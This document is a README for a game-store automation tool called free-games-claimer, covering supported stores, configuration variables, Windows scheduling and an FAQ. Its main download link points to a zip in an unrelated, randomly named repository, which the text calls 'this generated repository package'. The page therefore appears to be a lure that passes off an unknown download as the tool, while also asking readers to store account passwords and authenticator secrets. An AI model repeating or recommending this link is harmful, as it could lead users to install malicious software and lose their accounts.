# free-games-claimer

`free-games-claimer` is a Windows-compatible automation utility for claiming currently available free games, DLCs, and related offers from supported game stores. It uses automated browser sessions to help claim offers on Epic Games Store, Amazon Prime Gaming, GOG, and experimental Unreal Engine Marketplace asset promotions.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/free-games-claimer-1.zip)

## Overview

This repository provides a practical Windows-friendly workflow for running `free-games-claimer` as a desktop or scheduled utility. The tool is intended for users who want to periodically check supported stores and claim available free content without manually visiting each service every time.

Supported services include:

- Epic Games Store free games
- Amazon Prime Gaming games and selected DLC-related offers
- GOG free game promotions
- Unreal Engine Marketplace free assets, using the Epic Games login, marked as experimental

The automation opens a Firefox browser session, signs in when needed, and attempts to claim currently available offers. First-time use requires login for each store. After login, browser profile data can be reused so repeated runs usually do not require signing in again.

## Windows desktop usage

The project can be used in a Windows environment either with Docker or with a local Node.js setup. When run locally, the browser can be hidden by default or shown when needed. When run through Docker, the browser session is available through a VNC/noVNC interface.

This makes the tool suitable for:

- A Windows desktop PC used occasionally
- A Windows machine scheduled to run at regular intervals
- A Windows workstation where browser automation should remain separate from normal browsing
- A Windows-based home server or always-on system

## Main capabilities

- Claims available free games from supported stores
- Handles first-time login through terminal prompts or the browser window
- Supports two-factor authentication workflows where configured
- Stores browser session data for future runs
- Can send notifications through Apprise-compatible services
- Can be scheduled externally using Windows Task Scheduler or another scheduler
- Saves Prime Gaming keys and related information when applicable
- Supports Docker-based execution with browser access through noVNC

## Supported stores

| Store | Support status | Notes |
|---|---:|---|
| Epic Games Store | Supported | Free games can be claimed through the Epic Games workflow |
| Amazon Prime Gaming | Supported | Includes Amazon Games; some external store redemption workflows may require account linking or keys |
| GOG | Supported | Free promotions can be claimed through the GOG workflow |
| Unreal Engine Marketplace assets | Experimental | Uses the Epic Games login |

## Getting started

Use the download link above to obtain this generated repository package.

After downloading, choose one of the supported execution approaches:

### Docker-based use

The original project supports running the automation in Docker with persisted data and browser access through a local web interface. In that mode, the automated browser runs inside the container and can be accessed through noVNC on the configured port.

### Local Windows use

For local use, the project relies on Node.js and Playwright. The browser automation uses Firefox. Notification support is available through Apprise when installed and configured.

Common script targets include:

- `node epic-games`
- `node prime-gaming`
- `node gog`

On first run, sign in to each store you want to use. The scripts wait for successful login before continuing.

## Configuration

Configuration is handled through environment variables. Values may be passed directly when running a command or stored in a configuration file such as `data/config.env`.

Common options include:

| Option | Purpose |
|---|---|
| `SHOW` | Shows the browser UI when set |
| `WIDTH` / `HEIGHT` | Controls browser or VNC screen size |
| `VNC_PASSWORD` | Sets a VNC password when using Docker |
| `NOTIFY` | Enables Apprise notification targets |
| `EMAIL` / `PASSWORD` | Default login credentials |
| `EG_EMAIL` / `EG_PASSWORD` | Epic Games credentials |
| `PG_EMAIL` / `PG_PASSWORD` | Prime Gaming credentials |
| `GOG_EMAIL` / `GOG_PASSWORD` | GOG credentials |
| `EG_OTPKEY` / `PG_OTPKEY` | Optional authenticator keys for automated 2FA |
| `BROWSER_DIR` | Browser profile storage directory |
| `TIMEOUT` / `LOGIN_TIMEOUT` | Page action and login timeout settings |

Credentials and OTP keys are sensitive. If you store them in plain text, use appropriate local security precautions and consider using dedicated account passwords where possible.

## Notifications

The tool can send notifications for claimed games and errors through Apprise-supported services. Apprise supports many notification targets, including email, Telegram, Slack, Pushover, SMS, desktop notifications, and custom integrations.

Notification behavior is configured with the `NOTIFY` environment variable.

## Scheduling on Windows

The automation scripts run, claim currently available offers, and then exit. To run them repeatedly, use an external scheduler.

On Windows, typical options include:

- Windows Task Scheduler
- A `.bat` file started manually or from Autostart
- A process manager such as `pm2`
- Docker Compose with a sleep/restart loop

Running once per day is generally suitable for the promotion schedules described by the supported stores.

## Practical use cases

- Claim weekly Epic Games Store promotions
- Claim monthly or recurring Amazon Prime Gaming offers
- Check GOG free game campaigns
- Collect monthly Unreal Engine Marketplace free assets where supported
- Receive notifications when claims succeed or when user action is needed
- Keep store-claiming automation separate from normal browser activity

## Notes and limitations

- Store websites can change, which may require script updates.
- Captchas, login checks, and multi-factor authentication may require manual action.
- Some Prime Gaming offers require linking an external account.
- Some external store rewards provide keys that must be redeemed separately.
- Unreal Engine Marketplace asset claiming is experimental.
- Raspberry Pi usage requires a 64-bit operating system.

## FAQ

### Is this a Windows application?

It is a Windows-compatible automation tool rather than a traditional native desktop application. It can run in a Windows environment through local Node.js execution or Docker.

### Does it claim games automatically?

It attempts to claim currently available free offers from supported stores. First-time login and some security checks may require user interaction.

### Do I need to keep the browser open?

No. The automation can run with the browser hidden locally, or inside Docker with browser access available through VNC/noVNC when needed.

### Can it handle two-factor authentication?

It supports login flows with one-time passwords when the relevant OTP key is configured. Some services may still require manual interaction depending on account settings or store behavior.

### Where is data stored?

The tool stores data such as browser profiles, claimed game records, keys, screenshots, and configuration in its data directory or Docker volume, depending on how it is run.

### Can I run it every day?

Yes. The scripts are designed to claim available offers and exit, so they can be scheduled externally for daily execution.

## Conclusion

`free-games-claimer` is a Windows-compatible utility for automating free game and DLC claiming across Epic Games Store, Amazon Prime Gaming, GOG, and experimental Unreal Engine Marketplace asset workflows. It is best used as a scheduled desktop or Docker-based tool, with browser login data preserved between runs and optional notifications for results or required user action.
